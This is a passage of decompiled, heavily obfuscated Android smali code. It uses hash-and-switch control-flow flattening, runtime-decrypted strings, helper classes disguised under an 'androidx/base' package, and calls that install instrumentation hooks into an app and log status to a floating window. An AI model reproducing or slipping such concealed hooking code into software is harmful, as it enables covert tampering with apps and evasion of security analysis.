    goto :goto_59

    :sswitch_f7
    const-string v2, "\u06da\u06d6\u06e7\u06e6\u06dc\u06d6\u06ec\u06e4\u06dc\u06d8\u06d8\u06dc\u06d7\u06db\u06e6\u06e1\u06d6\u06e7\u06eb\u06e2\u06e2\u06d6\u06e5\u06e8\u06e5\u06d8\u06e7\u06e5\u06e6\u06da\u06e1\u06e4\u06dc\u06e7\u06df\u06d8\u06e6\u06d9\u06e1\u06e5\u06e4\u06dc\u06e8\u06e7\u06d8\u06d8\u06e7\u06e1\u06e4\u06da\u06e2\u06e4\u06e1\u06dc\u06d8\u06d8\u06e4\u06e0"

    goto :goto_58

    :cond_20
    const-string v2, "\u06e1\u06d7\u06e5\u06d8\u06e0\u06d9\u06e5\u06e0\u06e8\u06e2\u06e2\u06e8\u06db\u06d7\u06ec\u06e0\u06e7\u06df\u06eb\u06e1\u06e2\u06e0\u06d7\u06e1\u06d8\u06d6\u06d7\u06df\u06e2\u06da\u06e2\u06e8\u06da\u06e2\u06e5\u06e1\u06d6\u06d8\u06da\u06df\u06df\u06d9\u06dc\u06e6"

    goto :goto_59

    :sswitch_f8
    const-string v2, "\u06e4\u06e4\u06d9\u06db\u06d6\u06e6\u06d8\u06e5\u06da\u06d6\u06d8\u06d7\u06df\u06dc\u06e0\u06d9\u06da\u06e2\u06e4\u06e5\u06e2\u06e1\u06e0\u06eb\u06e2\u06e6\u06d8\u06e5\u06d7\u06d8\u06da\u06d9\u06d8\u06d8\u06e8\u06d8\u06e6\u06dc\u06e8\u06e6\u06d8\u06e6\u06d9\u06d8\u06d8\u06eb\u06e7\u06d6\u06d8\u06db\u06ec\u06db\u06e5\u06d6\u06df\u06db\u06e5\u06e6\u06d8\u06e8\u06da"

    goto :goto_59

    :sswitch_f9
    const-string v2, "\u06eb\u06d7\u06e6\u06d8\u06d9\u06ec\u06d7\u06e4\u06d7\u06d6\u06d8\u06eb\u06e0\u06e1\u06d8\u06e7\u06eb\u06e2\u06e6\u06d6\u06e1\u06d8\u06e1\u06e1\u06e7\u06d8\u06df\u06e0\u06e8\u06db\u06d9\u06d6\u06d7\u06e0\u06e8\u06e7\u06ec\u06da\u06e5\u06dc\u06ec\u06e2\u06eb\u06e6\u06d8\u06dc\u06eb\u06e1"

    goto :goto_58

    :sswitch_fa
    const-string v2, "\u06d7\u06e2\u06e5\u06d8\u06df\u06dc\u06e2\u06e8\u06d7\u06e8\u06d8\u06e5\u06e7\u06e2\u06eb\u06db\u06e7\u06d8\u06eb\u06dc\u06d8\u06d6\u06df\u06d7\u06e7\u06d8\u06e5\u06d8\u06e0\u06e1\u06df\u06ec\u06e8\u06d8\u06d6\u06df\u06dc\u06d8\u06d7\u06e8\u06d6\u06d8"

    goto :goto_58

    :sswitch_fb
    invoke-static/range {p3 .. p3}, LKvrUY/RiiGL/HookManager;->hookInstrumentation(Landroid/content/Context;)V

    goto/16 :goto_2b

    :sswitch_fc
    invoke-static/range {p3 .. p3}, LKvrUY/RiiGL/HookManager;->initHooks(Landroid/content/Context;)V

    goto/16 :goto_2b

    :sswitch_fd
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Iw9OAQMwwH56SE1CktFKvq6d\n"

    const-string v6, "y6D557KyJdo=\n"

    invoke-static {v4, v6}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, "9SlW9g4KC3qKGzNAZEU2Cg==\n"

    const-string v5, "GpXax+mtmZ8=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "cReAYF0=\n"

    const-string v5, "FGXyDy+BSr8=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2b
    .catch Ljava/lang/Exception; {:try_start_2b .. :try_end_2b} :catch_7

    const/4 v2, 0x0

    const/4 v4, 0x0

    aget v4, p4, v4

    add-int/lit8 v4, v4, 0x1

    aput v4, p4, v2

    move-object v2, v3

    goto/16 :goto_20

    :sswitch_fe
    const-string v3, "\u06d8\u06dc\u06e8\u06d8\u06ec\u06dc\u06dc\u06d8\u06d7\u06d6\u06db\u06eb\u06e4\u06e5\u06e8\u06e4\u06e2\u06da\u06e7\u06e7\u06e4\u06e0\u06db\u06e5\u06e8\u06e8\u06d6\u06ec\u06eb\u06da\u06e1\u06ec\u06e5\u06e6\u06d6\u06d8\u06d6\u06dc\u06e8\u06eb\u06ec\u06eb\u06da\u06df\u06e5\u06ec\u06e8\u06db\u06e1\u06e7\u06ec"

    goto/16 :goto_21

    :cond_21
    const-string v3, "\u06e6\u06d9\u06e4\u06e6\u06eb\u06e5\u06d8\u06df\u06e8\u06e1\u06d8\u06eb\u06d9\u06e6\u06d8\u06e2\u06e4\u06e0\u06e2\u06ec\u06da\u06df\u06da\u06e2\u06e7\u06e5\u06e5\u06e6\u06d8\u06d8\u06d8\u06e0\u06dc\u06df\u06e1\u06da\u06dc\u06d6\u06d6\u06e2\u06db\u06e8\u06e7\u06d8\u06d6\u06e8\u06d8\u06d8\u06d8\u06eb\u06e5\u06d8\u06e0\u06d8\u06d8\u06d8"

    goto/16 :goto_22

    :sswitch_ff
    const/4 v3, 0x0

    aget v3, p4, v3

    const/4 v6, 0x3

    if-lt v3, v6, :cond_21

    const-string v3, "\u06e2\u06e0\u06ec\u06da\u06df\u06ec\u06ec\u06e0\u06e2\u06d8\u06e4\u06e0\u06df\u06e4\u06e4\u06ec\u06e5\u06e8\u06d8\u06dc\u06e5\u06dc\u06e2\u06d6\u06db\u06eb\u06df\u06e6\u06dc\u06e2\u06e2\u06d9\u06e2\u06e0\u06db\u06d6\u06d8\u06e4\u06e6\u06d6\u06d8\u06e4\u06e8\u06e6\u06d8\u06db\u06ec\u06e0\u06e7\u06d6\u06d8"

    goto/16 :goto_22

    :sswitch_100
    const-string v3, "\u06e1\u06e7\u06eb\u06e0\u06eb\u06d8\u06ec\u06df\u06e1\u06eb\u06d8\u06d8\u06e8\u06e7\u06e1\u06d8\u06d7\u06eb\u06e0\u06eb\u06e4\u06df\u06e2\u06e8\u06dc\u06d6\u06d7\u06e1\u06d8\u06e2\u06dc\u06ec\u06e7\u06dc\u06e4\u06d9\u06eb\u06d8\u06d7\u06d9\u06e8\u06e7\u06d8\u06d8\u06d9\u06dc\u06d8\u06db\u06d7\u06d8\u06d8\u06dc\u06e8\u06d9\u06e2\u06e1"

    goto/16 :goto_22

    :sswitch_101
    const-string v3, "\u06e4\u06e8\u06d8\u06e1\u06e1\u06e2\u06da\u06e5\u06e1\u06e0\u06d8\u06d9\u06e4\u06df\u06db\u06e5\u06d8\u06d8\u06d7\u06e8\u06e2\u06e8\u06e4\u06d6\u06d8\u06e4\u06dc\u06dc\u06d9\u06d6\u06d9\u06db\u06db\u06e1\u06d8\u06ec\u06d9\u06e7\u06db\u06e0\u06e7\u06d6\u06d6\u06d8\u06da\u06e6\u06dc\u06ec\u06df\u06dc\u06d6\u06db\u06d8\u06e0\u06e1\u06da"

    goto/16 :goto_21

    :sswitch_102
    const/4 v3, 0x0

    const/4 v4, 0x0

    aput v4, p4, v3

    const v4, -0x4fc55529

    const-string v3, "\u06ec\u06d6\u06e7\u06d8\u06dc\u06db\u06d7\u06db\u06e5\u06da\u06e2\u06e4\u06e1\u06d8\u06e5\u06ec\u06dc\u06da\u06e1\u06e1\u06d8\u06dc\u06e8\u06d6\u06d8\u06d6\u06e4\u06db\u06d6\u06d7\u06eb\u06e8\u06d6\u06d8"

    :goto_5a
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_44

    goto :goto_5a

    :sswitch_103
    const-string v3, "\u06e5\u06ec\u06dc\u06d8\u06d7\u06e4\u06e5\u06d8\u06d9\u06d7\u06e1\u06d8\u06d6\u06eb\u06e6\u06dc\u06e6\u06d7\u06e8\u06e2\u06e6\u06ec\u06eb\u06d7\u06d9\u06d8\u06e7\u06dc\u06dc\u06da\u06e5\u06d9\u06ec\u06e2\u06e1\u06e6\u06d8\u06e1\u06eb\u06e5\u06d8\u06d7\u06e5\u06e1\u06e1\u06df\u06df\u06df\u06e7\u06e4\u06e5\u06da\u06eb\u06db\u06d8\u06e6\u06e7\u06df\u06e4"

    goto :goto_5a

    :sswitch_104
    const-string v3, "\u06df\u06d6\u06e4\u06e4\u06d9\u06e5\u06d8\u06e4\u06e7\u06dc\u06d8\u06e4\u06db\u06e5\u06d8\u06e0\u06ec\u06e7\u06db\u06e5\u06d8\u06e8\u06df\u06e2\u06d7\u06e4\u06e5\u06e1\u06ec\u06dc\u06eb\u06d7\u06e5\u06e0\u06e1\u06e4\u06e2\u06e7\u06db"

    goto :goto_5a

    :sswitch_105
    const v5, -0x6d55d0ff

    const-string v3, "\u06db\u06e6\u06e7\u06d8\u06e2\u06d9\u06da\u06eb\u06d6\u06e5\u06dc\u06d9\u06df\u06e1\u06dc\u06e5\u06d8\u06d7\u06da\u06e2\u06db\u06db\u06dc\u06d8\u06ec\u06d8\u06dc\u06eb\u06e6\u06dc\u06d8\u06e1\u06ec\u06d8\u06d8\u06e6\u06e4\u06da\u06d9\u06d8\u06d8\u06e5\u06dc\u06e5\u06d8\u06eb\u06dc\u06e7\u06e1\u06e6\u06e4\u06df\u06d8\u06eb"

    :goto_5b
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_45

    goto :goto_5b

    :sswitch_106
    const-string v3, "\u06e0\u06e6\u06d6\u06e5\u06e1\u06e8\u06e4\u06d7\u06d7\u06e6\u06e6\u06e4\u06eb\u06e2\u06e7\u06d8\u06d8\u06d8\u06e6\u06e7\u06d7\u06e8\u06d7\u06e5\u06d8\u06db\u06e1\u06e0\u06e7\u06e8\u06d7\u06dc\u06e1\u06e0\u06e7\u06ec\u06e8\u06e6\u06d9\u06ec\u06e6\u06d6\u06d8\u06eb\u06df\u06eb\u06da\u06e1\u06e0\u06d9\u06ec\u06e6\u06d8"

    goto :goto_5b

    :cond_22
    const-string v3, "\u06eb\u06db\u06d6\u06d8\u06eb\u06e8\u06e5\u06d8\u06e0\u06da\u06d7\u06e2\u06e2\u06e6\u06ec\u06d9\u06d6\u06df\u06e6\u06ec\u06e1\u06d6\u06e0\u06db\u06e4\u06dc\u06eb\u06e7\u06e5\u06d8\u06d7\u06e1\u06d8\u06d8\u06df\u06ec\u06e5\u06e4\u06d6\u06e1\u06d8\u06e5\u06d8\u06e8\u06eb\u06eb\u06ec"

    goto :goto_5b

    :sswitch_107
    const/4 v3, 0x0

    aget v3, p0, v3

    if-nez v3, :cond_22

    const-string v3, "\u06d8\u06dc\u06da\u06e1\u06d6\u06e6\u06d8\u06e8\u06df\u06e7\u06d9\u06e4\u06e4\u06dc\u06eb\u06ec\u06eb\u06e1\u06e4\u06e1\u06e6\u06d8\u06eb\u06ec\u06e1\u06e5\u06e6\u06e2\u06db\u06e0\u06e8\u06d6\u06d9\u06e8\u06e1\u06d8\u06d6\u06df\u06e8\u06d8\u06e6\u06da\u06da\u06d8\u06e0\u06ec\u06db\u06e4\u06d6\u06d9\u06d9\u06ec\u06e8\u06e1\u06ec"

    goto :goto_5b

    :sswitch_108
    const-string v3, "\u06ec\u06e4\u06e8\u06d7\u06ec\u06e4\u06e1\u06e0\u06d7\u06e6\u06e4\u06e2\u06d7\u06df\u06d6\u06d6\u06e1\u06d8\u06e8\u06e8\u06d6\u06d8\u06e0\u06e7\u06e8\u06d8\u06e8\u06da\u06e7\u06d8\u06d8\u06e1\u06df\u06db\u06d8\u06d8\u06ec\u06e4\u06d7\u06e1\u06e8\u06e8\u06d8\u06df\u06e4\u06db\u06e5\u06da\u06e4\u06e5\u06e4\u06ec\u06e0\u06df\u06e5\u06d8\u06e4\u06eb\u06e6\u06d8"

    goto :goto_5a

    :sswitch_109
    const/4 v3, 0x0

    aget v3, p2, v3

    add-int/lit8 v3, v3, 0x1

    move-object/from16 v0, p1

    array-length v4, v0

    rem-int v4, v3, v4

    const/4 v3, 0x0

    aput v4, p2, v3

    const v5, -0x58424637

    const-string v3, "\u06e4\u06df\u06e4\u06d7\u06e6\u06d9\u06eb\u06e6\u06ec\u06d8\u06d7\u06d7\u06d8\u06e6\u06e8\u06dc\u06e6\u06e2\u06eb\u06e5\u06e8\u06d9\u06eb\u06ec\u06e1\u06e7\u06d6\u06e0\u06d9\u06dc\u06d8\u06e6\u06d9\u06db\u06e1\u06e2\u06ec\u06e1\u06df\u06d6\u06d9\u06db\u06e8\u06d8\u06e8\u06e8\u06d7\u06df"

    :goto_5c
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_46

    goto :goto_5c

    :sswitch_10a
    const/4 v3, 0x0

    const/4 v4, 0x1

    aput-boolean v4, p7, v3

    const/4 v3, 0x0

    const/4 v4, 0x1

    aput v4, p0, v3

    :goto_5d
    :sswitch_10b
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "kY+msn6wH6bD4ZDWFo5H7OmHzuhp\n"

    const-string v5, "dAchVPMS9wk=\n"

    invoke-static {v3, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const v5, 0x329b4b9a

    const-string v3, "\u06e0\u06d6\u06e1\u06d8\u06e0\u06e5\u06e6\u06d8\u06e5\u06ec\u06d8\u06d8\u06eb\u06e5\u06d8\u06e4\u06e8\u06d6\u06d8\u06e7\u06d6\u06d9\u06e7\u06e4\u06db\u06df\u06e0\u06dc\u06d8\u06e8\u06e5\u06ec\u06d6\u06e2\u06da\u06eb\u06e2\u06db\u06ec\u06d6\u06eb"

    :goto_5e
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_47

    goto :goto_5e

    :sswitch_10c
    const-string v3, "\u06e8\u06e6\u06e0\u06d7\u06e0\u06e1\u06e5\u06d9\u06e5\u06d7\u06d8\u06e7\u06e4\u06dc\u06da\u06d6\u06ec\u06e6\u06d8\u06eb\u06e5\u06e0\u06e2\u06eb\u06e1\u06d8\u06df\u06eb\u06d6\u06eb\u06d6\u06d7"

    goto :goto_5e

    :sswitch_10d
    const-string v3, "\u06eb\u06e7\u06d6\u06d8\u06e0\u06e1\u06e6\u06d8\u06e4\u06dc\u06d6\u06d8\u06db\u06dc\u06e1\u06d8\u06e8\u06e5\u06d7\u06e0\u06da\u06e8\u06d8\u06db\u06e4\u06dc\u06df\u06e2\u06db\u06da\u06db\u06e1\u06eb\u06d6\u06e5\u06d8\u06e5\u06df\u06e6\u06d8\u06ec\u06d7\u06dc\u06d8\u06db\u06d6\u06e4\u06e2\u06d6\u06eb"

    goto :goto_5c

    :sswitch_10e
    const v6, 0x2891ba86

    const-string v3, "\u06e4\u06e5\u06e4\u06e1\u06db\u06dc\u06d8\u06e4\u06d7\u06d9\u06db\u06d6\u06e1\u06e7\u06e5\u06d8\u06ec\u06e5\u06e8\u06d8\u06dc\u06e6\u06d8\u06d8\u06ec\u06db\u06d9\u06e5\u06da\u06e4\u06e7\u06df\u06e6"

    :goto_5f
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v6

    sparse-switch v7, :sswitch_data_48

    goto :goto_5f

    :sswitch_10f
    if-nez v4, :cond_23

    const-string v3, "\u06e8\u06e7\u06e0\u06d9\u06da\u06e8\u06e6\u06e0\u06e1\u06d8\u06df\u06e1\u06e7\u06e2\u06e1\u06eb\u06eb\u06e0\u06eb\u06e4\u06e2\u06e8\u06d6\u06e2\u06e2\u06e7\u06e5\u06e6\u06d8\u06db\u06d6\u06e5\u06db\u06d9\u06e1\u06eb\u06e7\u06ec\u06d6\u06d6\u06e6\u06d8\u06e7\u06dc\u06e6\u06d8\u06e5\u06d7\u06df\u06e0"

    goto :goto_5f

    :cond_23
    const-string v3, "\u06dc\u06df\u06d6\u06df\u06e1\u06e4\u06dc\u06d8\u06d8\u06d8\u06dc\u06e8\u06e2\u06ec\u06e6\u06e1\u06d8\u06ec\u06d8\u06e5\u06e0\u06e7\u06e6\u06eb\u06e4\u06e4\u06e8\u06e1\u06d8\u06e8\u06d8\u06e4\u06d9\u06d8\u06e5\u06e7\u06db\u06e5\u06df\u06df\u06e1\u06dc\u06e6\u06d6\u06d8"

    goto :goto_5f

    :sswitch_110
    const-string v3, "\u06e2\u06d8\u06e0\u06ec\u06e2\u06d8\u06d8\u06e0\u06d6\u06db\u06d6\u06d9\u06df\u06e6\u06df\u06eb\u06e1\u06e2\u06e1\u06d8\u06e5\u06da\u06e8\u06ec\u06e0\u06db\u06d8\u06e5\u06e0\u06da\u06d6\u06e2\u06e5\u06d8\u06da\u06db\u06e4\u06df\u06d7\u06e5\u06da\u06da\u06d6\u06ec\u06dc\u06db\u06e8\u06df\u06df"

    goto :goto_5f

    :sswitch_111
    const-string v3, "\u06ec\u06d6\u06d6\u06d8\u06db\u06d6\u06e6\u06d8\u06d6\u06e2\u06e7\u06e6\u06ec\u06da\u06d7\u06e5\u06d8\u06d8\u06d7\u06e1\u06eb\u06d9\u06d9\u06eb\u06d7\u06e4\u06db\u06dc\u06d6\u06e4\u06eb\u06e5\u06e0\u06d6\u06eb\u06d6\u06db\u06dc\u06df"

    goto :goto_5c

    :sswitch_112
    const-string v3, "\u06e4\u06da\u06e5\u06ec\u06d6\u06e6\u06d8\u06eb\u06eb\u06d6\u06d8\u06d9\u06e2\u06e6\u06e4\u06eb\u06e2\u06e5\u06e7\u06eb\u06ec\u06e2\u06d8\u06e1\u06d8\u06df\u06e1\u06da\u06eb\u06dc\u06e8\u06ec\u06da\u06e5\u06d8\u06db\u06e7\u06e1\u06d8\u06e7\u06e6\u06ec\u06d7\u06d7\u06dc\u06e1\u06db\u06e5\u06e6\u06e6\u06d8\u06da\u06db\u06e8\u06d8\u06eb\u06d8\u06d8\u06d8"

    goto :goto_5c

    :sswitch_113
    const/4 v3, 0x0

    aget v3, p2, v3

    add-int/lit8 v3, v3, 0x1

    sget-object v4, Landroidx/base/하늘;->a:[Ljava/lang/String;

    array-length v4, v4

    rem-int v4, v3, v4

    const/4 v3, 0x0

    aput v4, p2, v3

    const v5, -0x1e73a85d

    const-string v3, "\u06e7\u06db\u06e1\u06d8\u06e6\u06e5\u06e2\u06e8\u06e4\u06db\u06e0\u06da\u06e8\u06d8\u06e8\u06dc\u06df\u06eb\u06da\u06db\u06d8\u06d8\u06e8\u06da\u06dc\u06d8\u06db\u06dc\u06d7\u06db\u06df\u06e4\u06e0\u06dc\u06e4\u06da\u06df\u06e5\u06da\u06d9\u06ec\u06e5\u06e0\u06e6\u06d8\u06df\u06e8\u06d8\u06e4\u06db\u06e0\u06dc\u06ec\u06e8\u06d8\u06d8\u06d9"

    :goto_60
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_49

    goto :goto_60

    :sswitch_114
    const-string v3, "\u06e1\u06d6\u06d8\u06d8\u06da\u06dc\u06e2\u06df\u06d7\u06d6\u06d8\u06e8\u06dc\u06e8\u06d8\u06d8\u06d7\u06e1\u06d8\u06da\u06d7\u06d6\u06d8\u06e8\u06e2\u06d9\u06df\u06eb\u06dc\u06d8\u06df\u06e6\u06d8\u06da\u06d6\u06d7"

    goto :goto_60

    :sswitch_115
    const-string v3, "\u06d8\u06d9\u06dc\u06d8\u06e4\u06e6\u06df\u06ec\u06e0\u06e4\u06dc\u06ec\u06e4\u06e6\u06e5\u06e4\u06e6\u06e5\u06dc\u06d6\u06d6\u06e6\u06d8\u06da\u06e8\u06eb\u06ec\u06e7\u06df\u06d8\u06e4\u06e2\u06e5\u06e0\u06d6\u06da\u06db\u06e6\u06e2\u06e7\u06d9\u06df\u06e8\u06e1\u06eb\u06e2\u06d9\u06dc\u06d8\u06ec\u06e4\u06d6\u06d8\u06d9\u06d6\u06e8"

    goto :goto_60

    :sswitch_116
    const v6, -0x47e34280

    const-string v3, "\u06e7\u06e2\u06e8\u06eb\u06db\u06e5\u06d8\u06e6\u06e5\u06d7\u06e2\u06d8\u06d6\u06d8\u06df\u06eb\u06dc\u06d8\u06e4\u06e2\u06e8\u06d8\u06e2\u06e4\u06e5\u06d9\u06dc\u06d8\u06eb\u06e6\u06e5\u06d8\u06e6\u06d9\u06e1\u06d8\u06db\u06df\u06e5\u06d8\u06db\u06dc\u06d8\u06e1\u06eb\u06dc\u06d8\u06dc\u06e5\u06e7\u06e4\u06d6\u06da\u06eb\u06d7\u06d9"

    :goto_61
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v6

    sparse-switch v7, :sswitch_data_4a

    goto :goto_61

    :sswitch_117
    if-nez v4, :cond_24

    const-string v3, "\u06e2\u06ec\u06d6\u06d9\u06dc\u06e8\u06eb\u06e0\u06db\u06ec\u06e6\u06d7\u06e1\u06e2\u06e6\u06d8\u06e8\u06d9\u06e7\u06ec\u06db\u06df\u06e0\u06d8\u06e5\u06d8\u06e5\u06eb\u06d6\u06d9\u06da\u06d6\u06d8\u06e7\u06dc\u06e6\u06e4\u06e7\u06e8\u06d8\u06df\u06e5\u06e8\u06d8\u06eb\u06e7\u06d8\u06e8\u06d8\u06e4\u06e0\u06da\u06d6\u06d8"

    goto :goto_61

    :cond_24
    const-string v3, "\u06e8\u06da\u06db\u06d9\u06d9\u06e4\u06e2\u06eb\u06e1\u06e6\u06e6\u06e7\u06dc\u06df\u06e6\u06d8\u06d7\u06e5\u06da\u06df\u06d8\u06e6\u06d8\u06d7\u06e6\u06e1\u06d8\u06e0\u06e0\u06da\u06e4\u06d7\u06e6\u06d8\u06da\u06dc\u06d7\u06ec\u06df\u06d6\u06d8\u06ec\u06e2\u06e1\u06d8\u06e4\u06e5\u06e4"

    goto :goto_61

    :sswitch_118
    const-string v3, "\u06e7\u06df\u06d8\u06d8\u06ec\u06e0\u06d8\u06e5\u06d9\u06db\u06e1\u06ec\u06d9\u06e2\u06e2\u06df\u06e6\u06d7\u06d9\u06df\u06dc\u06eb\u06e2\u06e8\u06d8\u06d8\u06e0\u06e2\u06dc\u06d8\u06da\u06dc\u06e6\u06d8\u06dc\u06da\u06e2\u06e2\u06e8\u06e8\u06dc\u06d8\u06d9\u06d8\u06dc\u06d8\u06e8\u06d8\u06e7\u06d8\u06db\u06dc\u06e4\u06eb\u06ec\u06e1\u06d6\u06e6"

    goto :goto_61

    :sswitch_119
    const-string v3, "\u06df\u06dc\u06e1\u06d8\u06e7\u06da\u06e8\u06d8\u06db\u06d8\u06e8\u06d9\u06e0\u06e7\u06e4\u06d9\u06e6\u06d8\u06e2\u06d8\u06e8\u06d8\u06e0\u06df\u06e7\u06eb\u06eb\u06ec\u06db\u06e5\u06e2\u06e6\u06d8\u06d6\u06eb\u06da\u06d7\u06df\u06e5\u06dc\u06df\u06d6\u06d9\u06e4\u06df\u06e6\u06df\u06d8\u06ec\u06e5\u06e8\u06e1\u06d8"

    goto :goto_60

    :sswitch_11a
    const/4 v3, 0x0

    const/4 v4, 0x1

    aput-boolean v4, p8, v3

    const v4, 0x4e7fd5b3

    const-string v3, "\u06e8\u06e6\u06d6\u06e1\u06df\u06e5\u06d8\u06e7\u06d6\u06e7\u06d9\u06e1\u06e4\u06e7\u06dc\u06e8\u06d8\u06db\u06e7\u06df\u06e4\u06dc\u06df\u06d6\u06e2\u06e1\u06e6\u06d9\u06e5\u06d9\u06e8"

    :goto_62
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_4b

    goto :goto_62

    :sswitch_11b
    const v4, -0x13e15c9d

    const-string v3, "\u06e0\u06d8\u06d7\u06d9\u06df\u06d7\u06e6\u06e4\u06d6\u06d8\u06d9\u06d8\u06df\u06e1\u06e7\u06e2\u06db\u06e7\u06da\u06e8\u06e0\u06da\u06ec\u06d6\u06e5\u06da\u06e7\u06d7\u06d6\u06e6\u06d8\u06d9\u06da\u06da\u06ec\u06e8\u06e2"

    :goto_63
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_4c

    goto :goto_63

    :sswitch_11c
    const/4 v3, 0x0

    const/4 v4, 0x0

    aget v4, p10, v4

    add-int/lit8 v4, v4, 0x1

    aput v4, p10, v3

    const/4 v3, 0x0

    const/4 v4, 0x0

    aput-boolean v4, p7, v3

    const/4 v3, 0x0

    const/4 v4, 0x0

    aput-boolean v4, p8, v3

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "eUv/wJqdd2A8MviX4rMdNxRHqImrPQ==\n"

    const-string v5, "nNdPJQcdkdE=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v4, 0x0

    aget v4, p10, v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, "J5OsdNBvh6So7g==\n"

    const-string v5, "B3sR2jXfGkw=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, "mj5I9g==\n"

    const-string v5, "7V86mH+4x0U=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    const v4, -0x14d00226

    const-string v3, "\u06e7\u06e1\u06eb\u06e2\u06dc\u06e5\u06d9\u06e8\u06e7\u06d8\u06df\u06e8\u06e8\u06e0\u06e2\u06da\u06e6\u06e2\u06e8\u06dc\u06d9\u06df\u06d9\u06e0\u06e0\u06ec\u06d7\u06e2\u06d6\u06d7\u06db\u06da\u06dc\u06e0\u06e7\u06ec\u06eb"

    :goto_64
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_4d

    goto :goto_64

    :sswitch_11d
    const/4 v3, 0x0

    xor-int/lit8 v4, p9, 0x1

    aput v4, p0, v3

    goto/16 :goto_5d

    :sswitch_11e
    const-string v3, "\u06e1\u06d8\u06e1\u06d8\u06e4\u06ec\u06df\u06e4\u06e0\u06dc\u06d6\u06ec\u06e8\u06e1\u06d9\u06e8\u06dc\u06db\u06e2\u06ec\u06e7\u06e5\u06e8\u06e8\u06e6\u06d8\u06d8\u06eb\u06d6\u06e6\u06da\u06d6\u06d8\u06e8\u06e5\u06e5\u06d8\u06e2\u06dc\u06d6\u06d8\u06e8\u06d7\u06d6\u06d8\u06d9\u06d7\u06e6\u06d8"

    goto :goto_62

    :sswitch_11f
    const v5, 0x3e86ab0b

    const-string v3, "\u06e6\u06df\u06dc\u06db\u06da\u06d7\u06df\u06eb\u06e6\u06d8\u06e6\u06d6\u06df\u06d7\u06ec\u06d6\u06e1\u06df\u06d9\u06dc\u06e6\u06e1\u06eb\u06e1\u06df\u06d7\u06d8\u06dc\u06d7\u06da\u06eb\u06e7\u06ec\u06e4\u06e0\u06da\u06dc\u06d8"

    :goto_65
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_4e

    goto :goto_65

    :sswitch_120
    const-string v3, "\u06e8\u06d7\u06db\u06dc\u06df\u06e8\u06d8\u06df\u06e0\u06e1\u06d8\u06d8\u06d7\u06dc\u06da\u06df\u06e8\u06df\u06e8\u06ec\u06da\u06e8\u06e2\u06e8\u06e6\u06ec\u06ec\u06e0\u06df\u06e6\u06da\u06da\u06d6\u06e1\u06da\u06d6\u06e6\u06e8\u06e5\u06e1\u06ec\u06d7\u06d8\u06e1"

    goto :goto_65

    :cond_25
